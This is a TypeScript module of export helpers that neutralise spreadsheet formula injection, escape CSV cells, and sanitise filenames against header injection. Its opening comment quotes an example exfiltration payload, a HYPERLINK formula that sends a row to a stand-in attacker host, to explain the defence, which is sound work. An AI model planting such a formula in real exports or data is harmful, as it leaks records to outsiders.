/**
 * Export primitives — brief §36, docs/SECURITY.md §8.
 *
 * Exports are the one place this system hands data to another program. Two
 * things go wrong there, and neither is theoretical:
 *
 *   1. FORMULA INJECTION. A cell beginning `=`, `+`, `-`, `@`, or certain
 *      control characters is executed by Excel, Sheets, and LibreOffice when
 *      the file is opened. An employee whose "notes" field reads
 *      `=HYPERLINK("https://evil.example?d="&A1,"Click")` exfiltrates the row
 *      to whoever opens the export. The attacker needs only a field they can
 *      edit — a name, a note, a job title.
 *
 *   2. CSV STRUCTURE. A value containing a comma, quote, or newline that is
 *      not quoted and escaped silently shifts every later column, which is
 *      worse than an error because the file still opens.
 *
 * Free of any server import so both are directly testable.
 */

/**
 * Characters that make a spreadsheet treat a cell as a formula.
 *
 * Tab and carriage return are included because Excel strips leading whitespace
 * before deciding, so "\t=cmd()" is still a formula.
 */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutralises a value for spreadsheet output.
 *
 * A leading apostrophe is the standard mitigation: Excel and Sheets treat the
 * cell as literal text and do not display the apostrophe itself. The value is
 * preserved, not stripped — an export that quietly drops "-5" would be worse
 * than the injection.
 */
export function neutraliseFormula(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix)) ? `'${value}` : value;
}

/** A cell value before formatting. `null`/`undefined` both mean "blank". */
export type CellValue = string | number | boolean | Date | null | undefined;

/**
 * Renders a cell as text.
 *
 * Dates use ISO `yyyy-mm-dd`: unambiguous, sortable as text, and free of the
 * dd/mm-vs-mm/dd ambiguity that silently corrupts dates between locales.
 */
export function formatCell(value: CellValue): string {
  if (value === null || value === undefined) return "";
  if (value instanceof Date) return value.toISOString().slice(0, 10);
  if (typeof value === "boolean") return value ? "Yes" : "No";
  return String(value);
}

/**
 * Escapes a value for CSV (RFC 4180) after neutralising formulas.
 *
 * Order matters: neutralise first, then quote. Quoting first would leave the
 * apostrophe outside the quotes and change the value.
 */
export function toCsvCell(value: CellValue): string {
  const text = neutraliseFormula(formatCell(value));
  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

export type ExportColumn<TRow> = {
  key: string;
  header: string;
  /** Pulled from the row rather than indexed, so a column can be computed. */
  value: (row: TRow) => CellValue;
  width?: number;
};

/**
 * Builds a CSV document.
 *
 * CRLF line endings and a UTF-8 BOM, both for Excel: without the BOM Excel
 * reads the file as the system codepage and mangles every Arabic name.
 */
export function toCsv<TRow>(columns: readonly ExportColumn<TRow>[], rows: readonly TRow[]): string {
  const lines = [
    columns.map((column) => toCsvCell(column.header)).join(","),
    ...rows.map((row) => columns.map((column) => toCsvCell(column.value(row))).join(",")),
  ];
  return `﻿${lines.join("\r\n")}\r\n`;
}

/**
 * Sanitises a filename for the Content-Disposition header.
 *
 * A report name reaches this from a URL parameter, so path separators, quotes,
 * and CR/LF are all removed — the last of those would allow header injection.
 */
export function safeFilename(name: string, extension: string): string {
  const base = name
    .replace(/[^a-zA-Z0-9 _-]/g, "")
    .trim()
    .replace(/\s+/g, "-")
    .slice(0, 80);
  return `${base || "report"}.${extension}`;
}
